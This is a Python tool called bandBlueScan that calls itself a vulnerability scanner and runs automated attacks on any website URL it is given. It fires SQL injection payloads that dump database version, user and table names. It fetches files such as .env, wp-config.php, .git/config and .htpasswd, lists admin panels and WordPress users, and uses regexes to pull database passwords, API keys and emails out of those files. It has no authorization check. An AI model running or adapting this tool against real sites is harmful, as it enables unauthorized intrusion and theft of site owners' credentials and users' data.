#!/usr/bin/env python3
"""
Advanced website vulnerability scanner and data extractor
"""
import requests
import re
import json
import time
import threading
import base64
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import html
import random
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
from rich.text import Text
from rich.markdown import Markdown
from rich.syntax import Syntax
from rich.layout import Layout
from rich.align import Align
from rich import box

class bandBlueScan:
    def __init__(self, target):
        self.target = target if target.startswith('http') else f'https://{target}'
        self.console = Console()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        self.results = {
            'vulnerabilities': [],
            'sensitive_files': [],
            'exposed_data': [],
            'admin_panels': [],
            'database_info': [],
            'users_emails': [],
            'config_data': {}
        }
        
        self.show_banner()
    def show_banner(self):
        banner_text = """
==============================================================
                  _______  _______  _______
                 |       ||       ||       |
                 |  _____||   _   ||    ___|
                 | |_____ |  | |  ||   |___
                 |_____  ||  |_|  ||    ___|
                  _____| ||       ||   |___
                 |_______||_______||_______|
║                                                              ║
║                                                              ║
║                Advanced Web Security Scanner                 ║
║                     Version 2.0 | ThebandBlue                ║
╚══════════════════════════════════════════════════════════════╝
"""        
        self.console.print(Panel(
            Align.center(banner_text),
            style="bold red",
            box=box.DOUBLE_EDGE,
            padding=(1, 2)
        ))
        
        self.console.print(Panel(
            f"[bold cyan]Target:[/bold cyan] [yellow]{self.target}[/yellow]\n"
            f"[bold cyan]Started:[/bold cyan] [green]{time.strftime('%Y-%m-%d %H:%M:%S')}[/green]",
            title="🚀 Scan Information",
            style="bold blue",
            box=box.ROUNDED
        ))

    def advanced_sql_injection_scan(self, progress):
        task = progress.add_task("[red]Scanning SQL Injection...", total=100)
        
        test_endpoints = self._discover_parameters()
        sql_payloads = self._generate_sql_payloads()
        
        vulnerable_points = []
        total_tests = min(len(test_endpoints) * len(sql_payloads), 1000)
        completed = 0
        
        for endpoint in test_endpoints[:20]:
            for payload in sql_payloads:
                try:
                    test_url = self._construct_test_url(endpoint, payload)
                    response = self.session.get(test_url, timeout=8, allow_redirects=False)
                    
                    if self._is_sql_vulnerable(response, endpoint):
                        vuln_info = {
                            'type': 'SQL Injection',
                            'url': test_url,
                            'parameter': endpoint['param'],
                            'payload': payload,
                            'confidence': 'High' if 'union' in payload.lower() else 'Medium'
                        }
                        vulnerable_points.append(vuln_info)
                        
                        progress.console.print(
                            f"[red]💉 SQL Injection Found:[/red] [yellow]{endpoint['param']}[/yellow]"
                        )
                        break
                        
                except Exception as e:
                    continue
                
                completed += 1
                progress.update(task, advance=100/total_tests)
        
        self.results['vulnerabilities'].extend(vulnerable_points)
        progress.update(task, completed=100)
        return vulnerable_points

    def _discover_parameters(self):
        endpoints = []      
        try:
            response = self.session.get(self.target, timeout=10)
            
            param_patterns = [
                r'href=["\'][^"\']*\?([^"\']+)["\']',
                r'action=["\'][^"\']*\?([^"\']+)["\']',
                r'window\.location=[^?]*\?([^\'"&]+)'
            ]
            
            for pattern in param_patterns:
                matches = re.findall(pattern, response.text, re.IGNORECASE)
                for match in matches:
                    params = match.split('&')
                    for param in params:
                        if '=' in param:
                            param_name = param.split('=')[0]
                            endpoints.append({
                                'url': self.target,
                                'param': param_name,
                                'method': 'GET'
                            })
        except:
            pass
        
        common_params = ['id', 'page', 'product', 'category', 'user', 'view', 'file', 'search']
        for param in common_params:
            endpoints.append({
                'url': self.target,
                'param': param,
                'method': 'GET'
            })
        
        return endpoints

    def _generate_sql_payloads(self):
        payloads = [
            "' AND '1'='1",
            "' AND '1'='2", 
            "' OR '1'='1",
            
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT version(),user(),database()--",
            "' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
            
            "' AND EXTRACTVALUE(1,CONCAT(0x3a,version()))--",
            "' AND UPDATEXML(1,CONCAT(0x3a,user()),1)--",
            
            "' AND SLEEP(5)--",
            "' ; WAITFOR DELAY '00:00:05'--"
        ]
        return payloads

    def _construct_test_url(self, endpoint, payload):
        if '?' in endpoint['url']:
            return f"{endpoint['url']}&{endpoint['param']}=1{payload}"
        else:
            return f"{endpoint['url']}?{endpoint['param']}=1{payload}"

    def _is_sql_vulnerable(self, response, endpoint):
        indicators = [
            'sql' in response.text.lower(),
            'syntax' in response.text.lower(),
            'mysql' in response.text.lower(),
            'warning' in response.text.lower(),
            'error' in response.text.lower(),
            'union' in response.text.lower() and any(str(i) in response.text for i in range(10)),
            'postgresql' in response.text.lower(),
            'microsoft sql' in response.text.lower()
        ]
        return any(indicators)

    def comprehensive_file_discovery(self, progress):
        task = progress.add_task("[blue]Discovering sensitive files...", total=100)
        
        file_lists = self._get_file_lists()
        found_files = []
        total_files = sum(len(file_list) for file_list in file_lists)
        checked = 0
        
        for file_list in file_lists:
            for file_path in file_list:
                result = self._check_file(file_path)
                if result['exists']:
                    found_files.append(result)
                    progress.console.print(
                        f"[green]✅ File Found:[/green] [yellow]{result['url']}[/yellow]"
                    )
                
                checked += 1
                progress.update(task, advance=100/total_files)
        
        self.results['sensitive_files'] = found_files
        progress.update(task, completed=100)
        return found_files

    def _get_file_lists(self):
        return [
            ['.env', '.env.local', '.env.production', '.env.development', '.env.example',
             'config.php', 'configuration.php', 'wp-config.php', 'settings.php',
             'app.config', 'web.config', 'config.json', 'config.xml',
             'database.php', 'db.php', 'connection.php'],
            
            ['backup.sql', 'database.sql', 'dump.sql', 'backup.zip',
             'backup.tar.gz', 'backup.rar', 'backup.7z', 'backup.tar',
             'backup.old', 'backup.new', 'backup.bak'],
            
            ['.git/config', '.git/HEAD', '.htaccess', '.htpasswd',
             'robots.txt', 'sitemap.xml', 'crossdomain.xml',
             'security.txt', '.well-known/security.txt'],
            
            ['phpinfo.php', 'info.php', 'test.php', 'debug.php',
             'server-status', 'server-info', 'status'],
            
            ['admin/', 'wp-admin/', 'administrator/', 'dashboard/',
             'phpmyadmin/', 'mysql/', 'dbadmin/', 'cpanel/',
             'webmin/', 'plesk/', 'controlpanel/']
        ]

    def _check_file(self, file_path):
        url = urljoin(self.target, file_path)
        try:
            response = self.session.get(url, timeout=5, allow_redirects=False)
            
            if response.status_code == 200 and len(response.content) > 10:
                return {
                    'url': url,
                    'path': file_path,
                    'exists': True,
                    'size': len(response.content),
                    'content_sample': response.text[:500] if response.text else ''
                }
        except:
            pass
        
        return {'url': url, 'exists': False}

    def admin_panel_discovery(self, progress):
        task = progress.add_task("[yellow]Discovering admin panels...", total=100)
        
        admin_paths = [
            'admin', 'wp-admin', 'administrator', 'dashboard', 
            'login', 'signin', 'admin/login', 'wp-login.php',
            'user/login', 'member/login', 'controlpanel',
            'backend', 'manager', 'system', 'console'
        ]
        
        found_panels = []
        total_paths = len(admin_paths)
        checked = 0
        
        for path in admin_paths:
            url = urljoin(self.target, path)
            try:
                response = self.session.get(url, timeout=5, allow_redirects=False)
                
                if response.status_code in [200, 301, 302, 403]:
                    is_login_page = any(indicator in response.text.lower() for indicator in 
                                      ['password', 'login', 'sign in', 'username', 'email'])
                    
                    panel_info = {
                        'url': url,
                        'status': response.status_code,
                        'is_login_page': is_login_page,
                        'title': self._extract_page_title(response.text)
                    }
                    
                    found_panels.append(panel_info)
                    progress.console.print(
                        f"[cyan]🔐 Admin:[/cyan] [yellow]{url}[/yellow]"
                    )
                    
            except:
                pass
            
            checked += 1
            progress.update(task, advance=100/total_paths)
        
        self.results['admin_panels'] = found_panels
        
        return found_panels

    def _extract_page_title(self, html_content):
        title_match = re.search(r'<title[^>]*>(.*?)</title>', html_content, re.IGNORECASE)
        return html.escape(title_match.group(1)) if title_match else 'No Title'

    def wordpress_reconnaissance(self, progress):
        task = progress.add_task("[green]WordPress reconnaissance...", total=100)
        
        wp_endpoints = [
            '/wp-json/wp/v2/users',
            '/wp-json/wp/v2/posts',
            '/wp-json/wp/v2/pages',
            '/wp-json/',
            '/wp-login.php',
            '/wp-admin/',
            '/wp-includes/',
            '/xmlrpc.php',
            '/wp-content/uploads/'
        ]
        
        wp_info = {'is_wordpress': False, 'users': [], 'version': None}
        total_endpoints = len(wp_endpoints)
        checked = 0
        
        for endpoint in wp_endpoints:
            url = urljoin(self.target, endpoint)
            try:
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200:
                    wp_info['is_wordpress'] = True
                    
                    if 'users' in endpoint:
                        try:
                            users_data = response.json()
                            for user in users_data:
                                wp_info['users'].append({
                                    'id': user.get('id'),
                                    'name': user.get('name'),
                                    'username': user.get('slug'),
                                    'email': user.get('email', 'Hidden')
                                })
                        except:
                            pass
                    
                    if endpoint == '/' or endpoint == '/wp-json/':
                        version_match = re.search(r'wordpress[^>]*?([0-9.]+)', response.text, re.IGNORECASE)
                        if version_match:
                            wp_info['version'] = version_match.group(1)
                            
            except:
                pass
            
            checked += 1
            progress.update(task, advance=100/total_endpoints)
        
        if wp_info['is_wordpress']:
            progress.console.print(
                f"[green]🔧 WordPress Site Detected[/green] - "
                f"Version: [yellow]{wp_info.get('version', 'Unknown')}[/yellow] - "
                f"Users: [cyan]{len(wp_info['users'])}[/cyan]"
            )
        
        self.results['wordpress_info'] = wp_info
        
        return wp_info

    def extract_sensitive_data(self, progress):
        """Extract sensitive data from discovered files"""
        task = progress.add_task("[magenta]Extracting sensitive data...", total=100)
        
        sensitive_data = {
            'database_credentials': [],
            'api_keys': [],
            'emails': [],
            'passwords': []
        }
        
        total_files = len(self.results['sensitive_files'])
        if total_files == 0:
            progress.update(task, completed=100)
            return sensitive_data
        
        processed = 0
        
        for file_info in self.results['sensitive_files']:
            if file_info['exists']:
                content = file_info.get('content_sample', '')
                
                patterns = {
                    'database_credentials': [
                        r"DB_PASSWORD\s*=\s*['\"]([^'\"]+)['\"]",
                        r"DB_USER\s*=\s*['\"]([^'\"]+)['\"]",
                        r"DB_NAME\s*=\s*['\"]([^'\"]+)['\"]",
                        r"DB_HOST\s*=\s*['\"]([^'\"]+)['\"]",
                        r"password\s*=>\s*['\"]([^'\"]+)['\"]",
                        r"username\s*=>\s*['\"]([^'\"]+)['\"]"
                    ],
                    'api_keys': [
                        r"api[_-]?key\s*=\s*['\"]([^'\"]+)['\"]",
                        r"secret[_-]?key\s*=\s*['\"]([^'\"]+)['\"]",
                        r"access[_-]?token\s*=\s*['\"]([^'\"]+)['\"]",
                        r"app[_-]?id\s*=\s*['\"]([^'\"]+)['\"]"
                    ],
                    'emails': [
                        r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
                    ],
                    'passwords': [
                        r"password\s*=\s*['\"]([^'\"]+)['\"]",
                        r"pwd\s*=\s*['\"]([^'\"]+)['\"]",
                        r"pass\s*=\s*['\"]([^'\"]+)['\"]"
                    ]
                }
                
                for data_type, pattern_list in patterns.items():
                    for pattern in pattern_list:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        for match in matches:
                            if len(match) > 3:
                                sensitive_data[data_type].append({
                                    'source': file_info['url'],
                                    'value': match
                                })
                                progress.console.print(
                                    f"[red]🔓 {data_type.upper()}:[/red] [white]{match}[/white]"
                                )
            
            processed += 1
            progress.update(task, advance=100/total_files)
        
        self.results['exposed_data'] = sensitive_data
        progress.update(task, completed=100)
        return sensitive_data

    def run_comprehensive_scan(self):
        self.console.print("\n[bold red]🚀 Starting Comprehensive Website Scan...[/bold red]")
        start_time = time.time()
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TaskProgressColumn(),
            console=self.console,
            transient=False,
        ) as progress:
            
            tasks = {
                'sql_scan': progress.add_task("[red]SQL Injection Scan", total=100),
                'file_scan': progress.add_task("[blue]File Discovery", total=100),
                'admin_scan': progress.add_task("[yellow]Admin Panel Discovery", total=100),
                'wp_scan': progress.add_task("[green]WordPress Recon", total=100)
            }
            
            with ThreadPoolExecutor(max_workers=4) as executor:
                future_to_scan = {
                    executor.submit(self.advanced_sql_injection_scan, progress): 'sql_scan',
                    executor.submit(self.comprehensive_file_discovery, progress): 'file_scan',
                    executor.submit(self.admin_panel_discovery, progress): 'admin_scan',
                    executor.submit(self.wordpress_reconnaissance, progress): 'wp_scan'
                }
                
                for future in future_to_scan:
                    try:
                        future.result(timeout=120)
                    except Exception as e:
                        self.console.print(f"[bold red]❌ Error in {future_to_scan[future]}: {e}[/bold red]")
            
            self.extract_sensitive_data(progress)
        
        end_time = time.time()
        scan_duration = end_time - start_time
        
        self.console.print(f"\n[bold green]✅ Scan completed in {scan_duration:.2f} seconds[/bold green]")
        
        return self.generate_report()

    def generate_report(self):
        exposed_data_count = 0
        if isinstance(self.results['exposed_data'], dict):
            exposed_data_count = sum(len(items) for items in self.results['exposed_data'].values())
        else:
            exposed_data_count = len(self.results['exposed_data'])
        self.console.print("\n[bold cyan]📊 Generating Final Report...[/bold cyan]")
        
        report = {
            'target': self.target,
            'scan_date': time.strftime('%Y-%m-%d %H:%M:%S'),
            'summary': {
                'vulnerabilities_found': len(self.results['vulnerabilities']),
                'sensitive_files_found': len(self.results['sensitive_files']),
                'admin_panels_found': len(self.results['admin_panels']),
                'exposed_data_items': sum(len(items) for items in self.results['exposed_data'].values())
            },
            'detailed_results': self.results
        }
        
        filename = f"scan_{time.strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        self._display_summary_table()
        
        return report

    def _display_summary_table(self):     
        summary_table = Table(
            title="🎯 ThebandBlue - Scan Summary",
            show_header=True,
            header_style="bold magenta",
            box=box.DOUBLE_EDGE,
            title_style="bold red"
        )
        
        summary_table.add_column("Category", style="cyan", width=20)
        summary_table.add_column("Count", style="green", justify="center")
        summary_table.add_column("Risk Level", style="yellow", justify="center")
        summary_table.add_column("Details", style="white")
        
        vuln_count = len(self.results['vulnerabilities'])
        files_count = len(self.results['sensitive_files'])
        admin_count = len(self.results['admin_panels'])
        data_count = sum(len(items) for items in self.results['exposed_data'].values())
        
        summary_table.add_row(
            "SQL Injection",
            str(vuln_count),
            "🔴 HIGH" if vuln_count > 0 else "🟢 LOW",
            f"{vuln_count} vulnerable parameters"
        )
        
        summary_table.add_row(
            "Sensitive Files", 
            str(files_count),
            "🟠 MEDIUM" if files_count > 0 else "🟢 LOW",
            f"{files_count} exposed files"
        )
        
        summary_table.add_row(
            "Admin Panels",
            str(admin_count),
            "🟡 MEDIUM" if admin_count > 0 else "🟢 LOW", 
            f"{admin_count} access points"
        )
        
        summary_table.add_row(
            "Exposed Data",
            str(data_count),
            "🔴 HIGH" if data_count > 0 else "🟢 LOW",
            f"{data_count} sensitive items"
        )
        
        self.console.print(summary_table)
        
        
        if vuln_count > 0 or data_count > 0:
            self.console.print("\n[bold red]🚨 CRITICAL FINDINGS:[/bold red]")
            
            if vuln_count > 0:
                vuln_table = Table(show_header=True, header_style="bold red", box=box.ROUNDED)
                vuln_table.add_column("Parameter", style="cyan")
                vuln_table.add_column("Payload", style="yellow")
                vuln_table.add_column("Confidence", style="green")
                
                for vuln in self.results['vulnerabilities'][:5]:
                    vuln_table.add_row(
                        vuln['parameter'],
                        vuln['payload'][:50] + "..." if len(vuln['payload']) > 50 else vuln['payload'],
                        vuln['confidence']
                    )
                
                self.console.print(vuln_table)
            
            if data_count > 0:
                data_table = Table(show_header=True, header_style="bold blue", box=box.ROUNDED)
                data_table.add_column("Data Type", style="cyan")
                data_table.add_column("Value", style="white")
                data_table.add_column("Source", style="yellow")
                
                for data_type, items in self.results['exposed_data'].items():
                    for item in items[:3]:  
                        data_table.add_row(
                            data_type.upper(),
                            item['value'][:50] + "..." if len(item['value']) > 50 else item['value'],
                            item['source'].split('/')[-1]
                        )
                
                self.console.print(data_table)
def main():
    console = Console()
    hacker = bandBlueScan("https://example.com")
    try:
        target_url = input("\n🎯 Enter target URL: ").strip()
        
        if not target_url:
            target_url = "http://testphp.vlunweb.com"
        
        hacker.target = target_url if target_url.startswith('http') else f'https://{target_url}'

        final_report = hacker.run_comprehensive_scan()
        
        console.print(
            Panel(
                f"[green]✅ Comprehensive scan completed![/green]\n"
                f"[yellow]📁 Report saved as: scan_*.json[/yellow]\n"
                f"[cyan]🎯 Target: {target_url}[/cyan]",
                title="🚀  - Mission Complete",
                style="bold green",
                box=box.DOUBLE_EDGE
            )
        )
        
    except KeyboardInterrupt:
        console.print("\n[bold red]⏹️ Scan interrupted by user[/bold red]")
    except Exception as e:
        console.print(f"\n[bold red]❌ Error: {e}[/bold red]")

if __name__ == "__main__":
    main()
